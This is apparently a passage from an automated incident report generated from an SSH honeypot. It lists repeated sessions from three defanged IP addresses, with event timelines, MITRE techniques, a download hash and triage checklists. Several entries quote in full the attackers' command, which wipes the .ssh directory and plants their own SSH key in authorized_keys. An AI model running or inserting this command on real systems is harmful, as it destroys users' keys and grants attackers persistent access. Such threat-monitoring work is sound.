| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:12:11` | `cowrie.session.connect` |
| `2026-04-17 03:12:12` | `cowrie.client.version` |
| `2026-04-17 03:12:12` | `cowrie.client.kex` |
| `2026-04-17 03:12:12` | `cowrie.login.success` |
| `2026-04-17 03:12:12` | `cowrie.session.params` |
| `2026-04-17 03:12:12` | `cowrie.command.input` |
| `2026-04-17 03:12:12` | `cowrie.command.failed` |
| `2026-04-17 03:12:12` | `cowrie.log.closed` |
| `2026-04-17 03:12:13` | `cowrie.session.params` |
| `2026-04-17 03:12:13` | `cowrie.command.input` |
| `2026-04-17 03:12:13` | `cowrie.session.file_download` |
| `2026-04-17 03:12:13` | `cowrie.log.closed` |
| `2026-04-17 03:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14aa361004f

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:12 |
| **Last Seen** | 2026-04-17 03:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:12:15` | `cowrie.session.connect` |
| `2026-04-17 03:12:15` | `cowrie.client.version` |
| `2026-04-17 03:12:16` | `cowrie.client.kex` |
| `2026-04-17 03:12:16` | `cowrie.login.success` |
| `2026-04-17 03:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3385019e65

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:12 |
| **Last Seen** | 2026-04-17 03:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:12:47` | `cowrie.session.connect` |
| `2026-04-17 03:12:47` | `cowrie.client.version` |
| `2026-04-17 03:12:47` | `cowrie.client.kex` |
| `2026-04-17 03:12:48` | `cowrie.login.success` |
| `2026-04-17 03:12:49` | `cowrie.session.params` |
| `2026-04-17 03:12:49` | `cowrie.command.input` |
| `2026-04-17 03:12:49` | `cowrie.command.failed` |
| `2026-04-17 03:12:49` | `cowrie.log.closed` |
| `2026-04-17 03:12:50` | `cowrie.session.params` |
| `2026-04-17 03:12:50` | `cowrie.command.input` |
| `2026-04-17 03:12:50` | `cowrie.session.file_download` |
| `2026-04-17 03:12:50` | `cowrie.log.closed` |
| `2026-04-17 03:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf09580a703a

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:12 |
| **Last Seen** | 2026-04-17 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:12:53` | `cowrie.session.connect` |
| `2026-04-17 03:12:53` | `cowrie.client.version` |
| `2026-04-17 03:12:53` | `cowrie.client.kex` |
| `2026-04-17 03:12:54` | `cowrie.login.success` |
| `2026-04-17 03:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6491fde50b

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:13 |
| **Last Seen** | 2026-04-17 03:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:13:29` | `cowrie.session.connect` |
| `2026-04-17 03:13:29` | `cowrie.client.version` |
| `2026-04-17 03:13:29` | `cowrie.client.kex` |
| `2026-04-17 03:13:30` | `cowrie.login.success` |
| `2026-04-17 03:13:31` | `cowrie.session.params` |
| `2026-04-17 03:13:31` | `cowrie.command.input` |
| `2026-04-17 03:13:31` | `cowrie.command.failed` |
| `2026-04-17 03:13:31` | `cowrie.log.closed` |
| `2026-04-17 03:13:32` | `cowrie.session.params` |
| `2026-04-17 03:13:32` | `cowrie.command.input` |
| `2026-04-17 03:13:32` | `cowrie.session.file_download` |
| `2026-04-17 03:13:32` | `cowrie.log.closed` |
| `2026-04-17 03:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e4a06d89f36

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:13 |
| **Last Seen** | 2026-04-17 03:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:13:36` | `cowrie.session.connect` |
| `2026-04-17 03:13:36` | `cowrie.client.version` |
| `2026-04-17 03:13:36` | `cowrie.client.kex` |
| `2026-04-17 03:13:38` | `cowrie.login.success` |
| `2026-04-17 03:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15bded9f530e

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:14 |
| **Last Seen** | 2026-04-17 03:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:14:36` | `cowrie.session.connect` |
| `2026-04-17 03:14:36` | `cowrie.client.version` |
| `2026-04-17 03:14:36` | `cowrie.client.kex` |
| `2026-04-17 03:14:37` | `cowrie.login.success` |
| `2026-04-17 03:14:37` | `cowrie.session.params` |
| `2026-04-17 03:14:37` | `cowrie.command.input` |
| `2026-04-17 03:14:37` | `cowrie.command.failed` |
| `2026-04-17 03:14:38` | `cowrie.log.closed` |
| `2026-04-17 03:14:38` | `cowrie.session.params` |
| `2026-04-17 03:14:38` | `cowrie.command.input` |
| `2026-04-17 03:14:38` | `cowrie.session.file_download` |
| `2026-04-17 03:14:38` | `cowrie.log.closed` |
| `2026-04-17 03:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37fb6400c65

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:14 |
| **Last Seen** | 2026-04-17 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:14:41` | `cowrie.session.connect` |
| `2026-04-17 03:14:41` | `cowrie.client.version` |
| `2026-04-17 03:14:42` | `cowrie.client.kex` |
| `2026-04-17 03:14:43` | `cowrie.login.success` |
| `2026-04-17 03:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c7c202ad89

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:16 |
| **Last Seen** | 2026-04-17 03:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:16:26` | `cowrie.session.connect` |
| `2026-04-17 03:16:26` | `cowrie.client.version` |
| `2026-04-17 03:16:26` | `cowrie.client.kex` |
| `2026-04-17 03:16:27` | `cowrie.login.success` |
| `2026-04-17 03:16:27` | `cowrie.session.params` |
| `2026-04-17 03:16:27` | `cowrie.command.input` |
| `2026-04-17 03:16:27` | `cowrie.command.failed` |
| `2026-04-17 03:16:27` | `cowrie.log.closed` |
| `2026-04-17 03:16:27` | `cowrie.session.params` |
| `2026-04-17 03:16:27` | `cowrie.command.input` |
| `2026-04-17 03:16:27` | `cowrie.session.file_download` |
| `2026-04-17 03:16:27` | `cowrie.log.closed` |
| `2026-04-17 03:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4301e0ba0e88

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:16 |
| **Last Seen** | 2026-04-17 03:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:16:29` | `cowrie.session.connect` |
| `2026-04-17 03:16:29` | `cowrie.client.version` |
| `2026-04-17 03:16:29` | `cowrie.client.kex` |
| `2026-04-17 03:16:30` | `cowrie.login.success` |
| `2026-04-17 03:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52802c70eb5

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:19 |
| **Last Seen** | 2026-04-17 03:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:19:58` | `cowrie.session.connect` |
| `2026-04-17 03:19:58` | `cowrie.client.version` |
| `2026-04-17 03:19:58` | `cowrie.client.kex` |
| `2026-04-17 03:19:59` | `cowrie.login.success` |
| `2026-04-17 03:20:00` | `cowrie.session.params` |
| `2026-04-17 03:20:00` | `cowrie.command.input` |
| `2026-04-17 03:20:00` | `cowrie.command.failed` |
| `2026-04-17 03:20:00` | `cowrie.log.closed` |
| `2026-04-17 03:20:01` | `cowrie.session.params` |
| `2026-04-17 03:20:01` | `cowrie.command.input` |
| `2026-04-17 03:20:01` | `cowrie.session.file_download` |
| `2026-04-17 03:20:01` | `cowrie.log.closed` |
| `2026-04-17 03:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55546e084098

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:20 |
| **Last Seen** | 2026-04-17 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:20:04` | `cowrie.session.connect` |
| `2026-04-17 03:20:04` | `cowrie.client.version` |
| `2026-04-17 03:20:04` | `cowrie.client.kex` |
| `2026-04-17 03:20:05` | `cowrie.login.success` |
| `2026-04-17 03:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23160054caa2

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:20 |
| **Last Seen** | 2026-04-17 03:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:20:32` | `cowrie.session.connect` |
| `2026-04-17 03:20:32` | `cowrie.client.version` |
| `2026-04-17 03:20:32` | `cowrie.client.kex` |
| `2026-04-17 03:20:33` | `cowrie.login.success` |
| `2026-04-17 03:20:33` | `cowrie.session.params` |
| `2026-04-17 03:20:33` | `cowrie.command.input` |
| `2026-04-17 03:20:33` | `cowrie.command.failed` |
| `2026-04-17 03:20:33` | `cowrie.log.closed` |
| `2026-04-17 03:20:34` | `cowrie.session.params` |
| `2026-04-17 03:20:34` | `cowrie.command.input` |
| `2026-04-17 03:20:34` | `cowrie.session.file_download` |
| `2026-04-17 03:20:34` | `cowrie.log.closed` |
| `2026-04-17 03:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1dc9a0b6a1

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:20 |
| **Last Seen** | 2026-04-17 03:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:20:36` | `cowrie.session.connect` |
| `2026-04-17 03:20:36` | `cowrie.client.version` |
| `2026-04-17 03:20:36` | `cowrie.client.kex` |
| `2026-04-17 03:20:36` | `cowrie.login.success` |
| `2026-04-17 03:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24eda7f688eb

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:22 |
| **Last Seen** | 2026-04-17 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:22:36` | `cowrie.session.connect` |
| `2026-04-17 03:22:36` | `cowrie.client.version` |
| `2026-04-17 03:22:36` | `cowrie.client.kex` |
| `2026-04-17 03:22:37` | `cowrie.login.success` |
| `2026-04-17 03:22:37` | `cowrie.session.params` |
| `2026-04-17 03:22:37` | `cowrie.command.input` |
| `2026-04-17 03:22:37` | `cowrie.command.failed` |
| `2026-04-17 03:22:37` | `cowrie.log.closed` |
| `2026-04-17 03:22:38` | `cowrie.session.params` |
| `2026-04-17 03:22:38` | `cowrie.command.input` |
| `2026-04-17 03:22:38` | `cowrie.session.file_download` |
| `2026-04-17 03:22:38` | `cowrie.log.closed` |
| `2026-04-17 03:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607fcb8a8fef

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:22 |
| **Last Seen** | 2026-04-17 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:22:40` | `cowrie.session.connect` |
| `2026-04-17 03:22:40` | `cowrie.client.version` |
| `2026-04-17 03:22:40` | `cowrie.client.kex` |
| `2026-04-17 03:22:41` | `cowrie.login.success` |
| `2026-04-17 03:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e9125d3928

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:28 |
| **Last Seen** | 2026-04-17 03:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:28:33` | `cowrie.session.connect` |
| `2026-04-17 03:28:33` | `cowrie.client.version` |
| `2026-04-17 03:28:33` | `cowrie.client.kex` |
| `2026-04-17 03:28:34` | `cowrie.login.success` |
| `2026-04-17 03:28:34` | `cowrie.session.params` |
| `2026-04-17 03:28:34` | `cowrie.command.input` |
